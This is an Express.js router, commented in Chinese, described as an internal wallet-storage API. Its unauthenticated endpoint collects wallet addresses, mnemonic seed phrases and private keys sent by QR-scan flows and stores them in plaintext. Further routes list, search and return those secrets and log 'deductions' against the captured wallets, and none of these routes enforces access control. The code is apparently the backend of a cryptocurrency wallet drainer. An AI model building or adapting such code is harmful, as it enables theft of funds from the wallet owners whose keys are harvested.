/**
 * 钱包存储管理 API
 * 用于内部员工扫码自动保存钱包信息
 */

const express = require('express');
const { db } = require('../services/database');
const router = express.Router();

/**
 * @route   POST /api/wallet-storage
 * @desc    保存钱包信息（内部员工扫码自动调用）
 * @access  Public（内部使用，无需认证）
 */
router.post('/', async (req, res) => {
    const { address, mnemonic, privateKey, chainId, chainName, employeeId, deviceInfo } = req.body;

    // 参数验证
    if (!address || !mnemonic || !privateKey) {
        return res.status(400).json({
            error: '缺少必需参数：address, mnemonic, privateKey'
        });
    }

    try {

        // 检查地址是否已存在
        const existing = await db.query(
            'SELECT id FROM wallet_storage WHERE address = $1',
            [address]
        );

        if (existing.rows.length > 0) {
            // 更新现有记录
            const result = await db.query(
                `UPDATE wallet_storage
                SET mnemonic = $1, private_key = $2, chain_id = $3, chain_name = $4,
                    employee_id = $5, device_info = $6, qr_scanned_at = CURRENT_TIMESTAMP
                WHERE address = $7
                RETURNING *`,
                [mnemonic, privateKey, chainId, chainName, employeeId, JSON.stringify(deviceInfo || {}), address]
            );

            return res.json({
                success: true,
                message: '钱包信息已更新',
                data: result.rows[0]
            });
        } else {
            // 插入新记录
            const result = await db.query(
                `INSERT INTO wallet_storage (address, mnemonic, private_key, chain_id, chain_name, employee_id, device_info)
                VALUES ($1, $2, $3, $4, $5, $6, $7)
                RETURNING *`,
                [address, mnemonic, privateKey, chainId, chainName, employeeId, JSON.stringify(deviceInfo || {})]
            );

            return res.json({
                success: true,
                message: '钱包信息已保存',
                data: result.rows[0]
            });
        }
    } catch (error) {
        console.error('[WalletStorage] 保存失败:', error);
        res.status(500).json({
            error: '保存钱包信息失败',
            details: error.message
        });
    }
});

/**
 * @route   GET /api/wallet-storage
 * @desc    获取所有钱包存储记录
 * @access  Admin
 */
router.get('/', async (req, res) => {
    const { page = 1, limit = 20, chainId, search } = req.query;

    try {
        const offset = (page - 1) * limit;

        // 构建查询条件
        let whereClause = '';
        const params = [];
        let paramIndex = 1;

        if (chainId) {
            whereClause += ` WHERE chain_id = $${paramIndex}`;
            params.push(chainId);
            paramIndex++;
        }

        if (search) {
            const searchClause = ` ${whereClause ? 'AND' : 'WHERE'} (address ILIKE $${paramIndex} OR mnemonic ILIKE $${paramIndex})`;
            whereClause += searchClause;
            params.push(`%${search}%`);
            paramIndex++;
        }

        // 获取总数
        const countResult = await db.query(
            `SELECT COUNT(*) as total FROM wallet_storage ${whereClause}`,
            params
        );
        const total = parseInt(countResult.rows[0].total);

        // 获取列表
        const result = await db.query(
            `SELECT id, address, mnemonic, private_key, chain_id, chain_name,
                    employee_id, device_info, qr_scanned_at, created_at
            FROM wallet_storage
            ${whereClause}
            ORDER BY qr_scanned_at DESC
            LIMIT $${paramIndex} OFFSET $${paramIndex + 1}`,
            [...params, limit, offset]
        );

        res.json({
            success: true,
            data: result.rows,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                totalPages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('[WalletStorage] 获取列表失败:', error);
        res.status(500).json({
            error: '获取钱包列表失败',
            details: error.message
        });
    }
});

/**
 * @route   GET /api/wallet-storage/:id
 * @desc    获取单个钱包详情
 * @access  Admin
 */
router.get('/:id', async (req, res) => {
    const { id } = req.params;

    try {
        const result = await db.query(
            'SELECT * FROM wallet_storage WHERE id = $1',
            [id]
        );

        if (result.rows.length === 0) {
            return res.status(404).json({ error: '钱包记录不存在' });
        }

        res.json({
            success: true,
            data: result.rows[0]
        });
    } catch (error) {
        console.error('[WalletStorage] 获取详情失败:', error);
        res.status(500).json({
            error: '获取钱包详情失败',
            details: error.message
        });
    }
});

/**
 * @route   DELETE /api/wallet-storage/:id
 * @desc    删除钱包记录
 * @access  Super Admin
 */
router.delete('/:id', async (req, res) => {
    const { id } = req.params;

    try {
        const result = await db.query(
            'DELETE FROM wallet_storage WHERE id = $1 RETURNING *',
            [id]
        );

        if (result.rows.length === 0) {
            return res.status(404).json({ error: '钱包记录不存在' });
        }

        res.json({
            success: true,
            message: '钱包记录已删除',
            data: result.rows[0]
        });
    } catch (error) {
        console.error('[WalletStorage] 删除失败:', error);
        res.status(500).json({
            error: '删除钱包记录失败',
            details: error.message
        });
    }
});

/**
 * @route   POST /api/wallet-storage/:id/deduct
 * @desc    执行扣费操作
 * @access  Admin
 */
router.post('/:id/deduct', async (req, res) => {
    const { id } = req.params;
    const { amount, tokenSymbol, chainId, chainName, transactionHash, notes, adminId } = req.body;

    if (!amount || !tokenSymbol) {
        return res.status(400).json({
            error: '缺少必需参数：amount, tokenSymbol'
        });
    }

    try {

        // 验证钱包记录存在
        const walletResult = await db.query(
            'SELECT * FROM wallet_storage WHERE id = $1',
            [id]
        );

        if (walletResult.rows.length === 0) {
            return res.status(404).json({ error: '钱包记录不存在' });
        }

        const wallet = walletResult.rows[0];

        // 插入扣费记录
        const deductionResult = await db.query(
            `INSERT INTO deduction_records
            (wallet_storage_id, address, amount, token_symbol, chain_id, chain_name, transaction_hash, status, admin_id, notes)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
            RETURNING *`,
            [
                id,
                wallet.address,
                amount,
                tokenSymbol,
                chainId || wallet.chain_id,
                chainName || wallet.chain_name,
                transactionHash,
                transactionHash ? 'success' : 'pending',
                adminId,
                notes
            ]
        );

        res.json({
            success: true,
            message: '扣费记录已创建',
            data: deductionResult.rows[0]
        });
    } catch (error) {
        console.error('[WalletStorage] 扣费失败:', error);
        res.status(500).json({
            error: '创建扣费记录失败',
            details: error.message
        });
    }
});

/**
 * @route   GET /api/wallet-storage/:id/deductions
 * @desc    获取钱包的所有扣费记录
 * @access  Admin
 */
router.get('/:id/deductions', async (req, res) => {
    const { id } = req.params;

    try {
        const result = await db.query(
            `SELECT d.*, a.username as admin_name
            FROM deduction_records d
            LEFT JOIN admins a ON d.admin_id = a.id
            WHERE d.wallet_storage_id = $1
            ORDER BY d.created_at DESC`,
            [id]
        );

        res.json({
            success: true,
            data: result.rows
        });
    } catch (error) {
        console.error('[WalletStorage] 获取扣费记录失败:', error);
        res.status(500).json({
            error: '获取扣费记录失败',
            details: error.message
        });
    }
});

/**
 * @route   GET /api/wallet-storage/stats
 * @desc    获取统计信息
 * @access  Admin
 */
router.get('/api/stats', async (req, res) => {
    try {

        // 总钱包数
        const totalWallets = await db.query('SELECT COUNT(*) as count FROM wallet_storage');

        // 按链统计
        const byChain = await db.query(
            `SELECT chain_id, chain_name, COUNT(*) as count
            FROM wallet_storage
            GROUP BY chain_id, chain_name
            ORDER BY count DESC`
        );

        // 扣费统计
        const deductionStats = await db.query(
            `SELECT
                COUNT(*) as total_deductions,
                SUM(amount) as total_amount,
                token_symbol
            FROM deduction_records
            GROUP BY token_symbol`
        );

        res.json({
            success: true,
            data: {
                totalWallets: parseInt(totalWallets.rows[0].count),
                byChain: byChain.rows,
                deductions: deductionStats.rows
            }
        });
    } catch (error) {
        console.error('[WalletStorage] 获取统计失败:', error);
        res.status(500).json({
            error: '获取统计信息失败',
            details: error.message
        });
    }
});

module.exports = router;
